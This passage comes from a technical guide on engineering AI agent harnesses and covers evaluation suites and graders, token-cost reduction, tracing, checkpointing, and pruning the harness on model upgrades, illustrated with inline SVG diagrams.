| Grader | How it scores                                                                        | Strength                  | Weakness                             |
| ------ | ------------------------------------------------------------------------------------ | ------------------------- | ------------------------------------ |
| Code   | Tests, state checks, string or regex matches, static analysis, tool-call checks      | Fast, cheap, reproducible | Brittle to valid variation           |
| Model  | A second model judges against a rubric, a reference answer, or a pairwise comparison | Handles open-ended output | Non-deterministic, needs calibration |
| Human  | Expert review or spot-check sampling                                                 | The reference standard    | Slow and expensive                   |

Use code graders where you can, model graders where you must, and human graders to calibrate the model graders. Grade what the agent produced rather than the path it took. A grader that demands an exact tool sequence punishes valid approaches that the author did not anticipate. Keep path checks for real invariants, such as a policy lookup before a refund. Give each rubric dimension its own judge, and let the judge answer "unknown" when the evidence is missing, so that it does not invent a verdict. Award partial credit on multi-part tasks, because an agent that finds the problem and fails the last step is better than one that fails at the start. Make the graders hard to game. Keep them out of the agent's reach, and prove each grader against a known correct answer before you trust its scores.

Agent behavior varies between runs, so one trial per task measures luck. Run several trials and pick the metric that matches the product. The pass@k metric is the probability that at least one of k trials succeeds, and it fits a tool where one good answer is enough. The pass^k metric is the probability that all k trials succeed, and it fits a customer-facing agent where users expect the same result every time. The two diverge fast. An agent with a 75% success rate per trial passes three trials in a row about 42% of the time. Give every trial a clean environment with no leftover files, caches, or git history from earlier trials, because shared state produces correlated failures and inflated scores. Measure the noise band by running the baseline several times, and count a change as a win only when the gain clears that band. Compare paired runs on the same tasks in the same environment. When one side of a pair produces no score, withhold the headline number instead of counting the gap as zero.

Keep two suites with different jobs. A capability suite asks what the agent can do, and it starts at a low pass rate so that there is a hill to climb. A regression suite asks whether the agent still does what it did, and it sits near 100%, so any drop means that something broke. When capability tasks saturate, move them into the regression suite, because a suite at 100% measures nothing new. Run both offline in CI on every harness change and every model upgrade. Online evaluation then scores a sample of production traces without reference answers, for quality, safety, and drift, and every failure it finds becomes a new offline task. Track tokens, cost, turns, and latency per task next to the pass rate, because a change that holds quality and doubles cost is a regression.

Static cases do not reach every behavior. A simulated user with a goal and a persona drives multi-turn conversations, which is the only way to evaluate a conversational agent at scale. Tool simulation replaces live APIs with simulated responses, so trials run safely and in parallel. Chaos testing injects tool timeouts, network errors, and corrupted responses, and it measures recovery. Red teaming attacks the agent and its sandbox to find what escapes.

Read the transcripts. A score says what happened and a transcript says why. Scores mislead in predictable ways: a grader that rejects a valid answer, a task that omits a requirement, or a harness limit that blocks the model. Read failed transcripts until each failure looks fair, which means the agent clearly did something wrong. Keep the suite as files in the repository next to the code, run it like unit tests, and let the people closest to the requirements contribute tasks. The loop that compounds runs from production traces to feedback, from feedback to new tasks, and from new tasks to a harness change that must pass the suite. The same suite makes model upgrades cheap. Run it on the new model and you know within hours which bets paid off.

Supporting frameworks: Strands (A.1), AgentCore (A.2), KiroCrew (A.3), Pi (A.4), LangChain (A.5), OpenAI (A.6), Stirrup (A.7).

---
---

# Part II: Running agents at scale

---

## 11. Token optimization

Token spend is the operating cost of an agent, and it grows with every session you add. The techniques below run in order of return on effort.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c11-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c11-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c11-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c11-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c11-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c11-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#FF9900"/>
<text x="55.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Plan</text>
<path d="M50.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#FF9900"/>
<text x="169.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Specify</text>
<path d="M164.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#FF9900"/>
<text x="283.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Build</text>
<path d="M278.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#FF9900"/>
<text x="397.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Test</text>
<path d="M392.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#FF9900"/>
<text x="511.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Verify</text>
<path d="M506.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#FF9900"/>
<text x="625.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Deploy</text>
<path d="M620.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#FF9900"/>
<text x="853.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Operate</text>
<path d="M848.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c11-g)"/>
<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M80.9 141.5 L292 64 L292 252 L80.9 141.5 Z" fill="#FF9900" opacity="0.10"/>
<line x1="80.9" y1="141.5" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="80.9" y1="141.5" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="87.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#FF9900" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#1a1a2e" text-anchor="end" font-weight="700">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#232F3E"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">What each cut is worth</text>
<rect x="760.0" y="76.0" width="12.0" height="10.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<text x="776.0" y="85.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">before</text>
<rect x="824.0" y="76.0" width="12.0" height="10.0" rx="2" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="840.0" y="85.0" font-size="9" fill="#44546f" text-anchor="start" font-weight="normal">after</text>
<text x="316.0" y="111.0" font-size="10" fill="#1a1a2e" text-anchor="start" font-weight="700">Tool result in context</text>
<text x="316.0" y="123.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">truncate and offload</text>
<rect x="560.0" y="101.0" width="250.0" height="12.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="560.0" y="115.0" width="9.4" height="12.0" rx="2" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="816.0" y="111.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">40,000 tokens</text>
<text x="575.4" y="125.0" font-size="8.5" fill="#1a1a2e" text-anchor="start" font-weight="700">1,500</text>
<text x="316.0" y="147.0" font-size="10" fill="#1a1a2e" text-anchor="start" font-weight="700">Default prompt per turn</text>
<text x="316.0" y="159.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">shrink the system prompt</text>
<rect x="560.0" y="137.0" width="250.0" height="12.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="560.0" y="151.0" width="87.8" height="12.0" rx="2" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="816.0" y="147.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">5,395</text>
<text x="653.8" y="161.0" font-size="8.5" fill="#1a1a2e" text-anchor="start" font-weight="700">1,895 (-65%)</text>
<text x="316.0" y="183.0" font-size="10" fill="#1a1a2e" text-anchor="start" font-weight="700">Advertising a capability</text>
<text x="316.0" y="195.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">a skill instead of a tool</text>
<rect x="560.0" y="173.0" width="250.0" height="12.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="560.0" y="187.0" width="6.2" height="12.0" rx="2" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="816.0" y="183.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">100 to 400</text>
<text x="572.2" y="197.0" font-size="8.5" fill="#1a1a2e" text-anchor="start" font-weight="700">about 10</text>
<text x="316.0" y="219.0" font-size="10" fill="#1a1a2e" text-anchor="start" font-weight="700">Harness, same model</text>
<text x="316.0" y="231.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">choice of harness</text>
<rect x="560.0" y="209.0" width="250.0" height="12.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="560.0" y="223.0" width="62.5" height="12.0" rx="2" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="816.0" y="219.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">4x the cost</text>
<text x="628.5" y="233.0" font-size="8.5" fill="#1a1a2e" text-anchor="start" font-weight="700">1x</text>
</svg>
</div>

Cap every tool result at a fixed threshold, such as the 1,500 tokens in section 4.3, because most of a long tool result is noise to the model. Offload the full result to storage as well, and leave a preview and a reference in context. Offloading and truncation together are what make a long-running agent affordable. Trigger compaction on a fraction of the context window rather than on a turn count, as section 4.2 describes.

Next, shrink the system prompt. Most system prompts still carry instructions the model no longer needs. Delete a paragraph, measure, and repeat. Stop declaring tools the model does not use, and move rarely used capability into skills, which cost far less context to advertise than tool declarations, as sections 3.2 and 3.3 show. For multi-step work, let the model write one script that loops instead of making twenty tool calls, because each avoided round trip also avoids resending the prefix.

Route by difficulty with care. A small model on easy turns and a large one on hard turns saves money. A misrouted hard task, however, costs more to recover from than the routing saved. Route only on a signal you trust. Generate structured output inside the main loop rather than in a second formatting call, because that second call is pure overhead.

None of this works without measurement. Record input, output, and reasoning tokens, cost, and per-tool call counts for every run. Record the timing of every model response and every tool call, so you can tell a slow model from a slow tool. The harness itself has parameters, which are the system prompt, the tool descriptions, and the skills. You can fit those parameters to data the way a model is trained, with rollouts in and rewards out, rather than guess them.

Supporting frameworks: Strands (A.1), AgentCore (A.2), Pi (A.4), LangChain (A.5), Stirrup (A.7).

---

## 12. Observability, durability, and evolving the harness

Instrument every tool call, every model response, and every context assembly, because the first misbehavior in production needs all three. Trace the assembled context as well as the calls. When an agent does something inexplicable, the question is always what it saw, and only a trace of the prompt answers it. Use an open trace standard instead of a vendor format, so that traces move between tools.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c12-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c12-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c12-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c12-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c12-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c12-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#edf0f4"/>
<text x="55.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Plan</text>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#edf0f4"/>
<text x="169.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Specify</text>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#edf0f4"/>
<text x="283.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Build</text>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#edf0f4"/>
<text x="397.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Test</text>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#edf0f4"/>
<text x="511.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Verify</text>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#FF9900"/>
<text x="625.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Deploy</text>
<path d="M620.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#FF9900"/>
<text x="853.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Operate</text>
<path d="M848.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c12-g)"/>
<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M102.7 111.5 L292 64 L292 252 L102.7 111.5 Z" fill="#FF9900" opacity="0.10"/>
<line x1="102.7" y1="111.5" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="102.7" y1="111.5" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="87.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#FF9900" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#1a1a2e" text-anchor="end" font-weight="700">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#232F3E"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">Trace what the agent saw, checkpoint every step, prune on upgrade</text>
<text x="316.0" y="109.0" font-size="9" fill="#6b7a90" text-anchor="start" font-weight="normal">session</text>
<text x="316.0" y="125.0" font-size="9" fill="#6b7a90" text-anchor="start" font-weight="normal">context</text>
<text x="316.0" y="141.0" font-size="9" fill="#6b7a90" text-anchor="start" font-weight="normal">model</text>
<text x="316.0" y="157.0" font-size="9" fill="#6b7a90" text-anchor="start" font-weight="normal">tools</text>
<text x="316.0" y="179.0" font-size="9" fill="#6b7a90" text-anchor="start" font-weight="normal">checkpoints</text>
<text x="316.0" y="201.0" font-size="9" fill="#6b7a90" text-anchor="start" font-weight="normal">after a crash</text>
<rect x="400.0" y="100.0" width="300.0" height="10.0" rx="2" fill="#232F3E" stroke="none" stroke-width="1.2"/>
<rect x="400.0" y="116.0" width="19.0" height="10.0" rx="2" fill="#e6f0ff" stroke="#0052CC" stroke-width="1"/>
<rect x="540.0" y="116.0" width="15.0" height="10.0" rx="2" fill="#e6f0ff" stroke="#0052CC" stroke-width="1"/>
<rect x="422.0" y="132.0" width="57.0" height="10.0" rx="2" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<rect x="558.0" y="132.0" width="53.0" height="10.0" rx="2" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<rect x="482.0" y="148.0" width="55.0" height="10.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="614.0" y="148.0" width="35.0" height="10.0" rx="2" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<path d="M420.0 170.5 L424.5 175.0 L420.0 179.5 L415.5 175.0 Z" fill="#1e7e34" stroke="#1e7e34" stroke-width="1.2"/>
<path d="M480.0 170.5 L484.5 175.0 L480.0 179.5 L475.5 175.0 Z" fill="#1e7e34" stroke="#1e7e34" stroke-width="1.2"/>
<path d="M538.0 170.5 L542.5 175.0 L538.0 179.5 L533.5 175.0 Z" fill="#1e7e34" stroke="#1e7e34" stroke-width="1.2"/>
<path d="M556.0 170.5 L560.5 175.0 L556.0 179.5 L551.5 175.0 Z" fill="#1e7e34" stroke="#1e7e34" stroke-width="1.2"/>
<path d="M612.0 170.5 L616.5 175.0 L612.0 179.5 L607.5 175.0 Z" fill="#1e7e34" stroke="#1e7e34" stroke-width="1.2"/>
<path d="M651.5 148.5 L660.5 157.5 M660.5 148.5 L651.5 157.5" stroke="#de350b" stroke-width="2.2" stroke-linecap="round"/>
<text x="666.0" y="157.0" font-size="8.5" fill="#de350b" text-anchor="start" font-weight="700">crash</text>
<path d="M612 181 C612 190 612 192 616 195" fill="none" stroke="#1e7e34" stroke-width="1.4" marker-end="url(#c12-gr)"/>
<rect x="618.0" y="192.0" width="58.0" height="10.0" rx="2" fill="#e3fcef" stroke="#1e7e34" stroke-width="1"/>
<text x="400.0" y="222.0" font-size="8.5" fill="#1e7e34" text-anchor="start" font-weight="600">a retry reuses finished steps and resumes at the first unfinished one</text>
<text x="400.0" y="240.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">each model span stores the assembled prompt, so you can see what the agent saw</text>
<text x="730.0" y="104.0" font-size="8" fill="#6b7a90" text-anchor="start" font-weight="700">ON EVERY MODEL UPGRADE</text>
<rect x="730.0" y="112.0" width="140.0" height="22.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="800.0" y="126.2" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">new model lands</text>
<rect x="730.0" y="144.0" width="140.0" height="22.0" rx="5" fill="#fffae6" stroke="#f5c56b" stroke-width="1.2"/>
<text x="800.0" y="158.2" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">remove one component</text>
<rect x="730.0" y="176.0" width="140.0" height="22.0" rx="5" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<text x="800.0" y="190.2" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">rerun the eval suite</text>
<rect x="730.0" y="208.0" width="140.0" height="22.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="800.0" y="222.2" font-size="9" fill="#1e7e34" text-anchor="middle" font-weight="600">keep it if scores hold</text>
<line x1="800.0" y1="136.5" x2="800.0" y2="141.5" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c12-d)"/>
<line x1="800.0" y1="168.5" x2="800.0" y2="173.5" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c12-d)"/>
<line x1="800.0" y1="200.5" x2="800.0" y2="205.5" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c12-d)"/>
<path d="M872 219 C896 219 896 155 873 155" fill="none" stroke="#FF9900" stroke-width="1.4" stroke-dasharray="4 3" marker-end="url(#c12-o)"/>
</svg>
</div>

Durable execution means that the harness saves a checkpoint after each step. A retry then replays the run, reuses the stored results of finished steps, and resumes at the first unfinished one. Add it when a run lasts long enough that losing it hurts. For a thirty-second run, retry the whole thing.

Every component in a harness encodes an assumption about something the model cannot do, and those assumptions go stale as models improve. An unpruned harness accumulates workarounds for problems that no longer exist, and each one costs tokens and adds a failure mode. On every model upgrade, remove the scaffolding that is no longer load-bearing, and add components for capabilities the new model makes reachable. Test by removing one component at a time and rerunning the suite from section 10. If you remove five at once and quality drops, you learn nothing about which one mattered. The context resets in section 4.4 are a live example. They compensate for weak long-context handling, and they turn into pure cost once the model handles long context well.

The investment case splits in two directions. For vertical, integration-heavy work, a custom harness gains value, because the integration with CI/CD, monitoring, feature flags, and internal services is the product. For general work the opposite happens. As long-term memory moves inside the model, context management moves out of harness code, and tool use and routing are likely to follow. Better models absorb the stable use cases, and the nuanced ones keep needing a harness. A lawyer who reviews a large case file still saturates the context however good the model gets, and the harness decides whether that workflow is usable.

Supporting frameworks: Strands (A.1), AgentCore (A.2), KiroCrew (A.3), Pi (A.4), LangChain (A.5), OpenAI (A.6).

---

## 13. The software factory

The earlier chapters improve one agent. A software factory changes the unit of work from a session to a stage on a production line. The change is in how work is organized, and the loop inside each session stays the same.

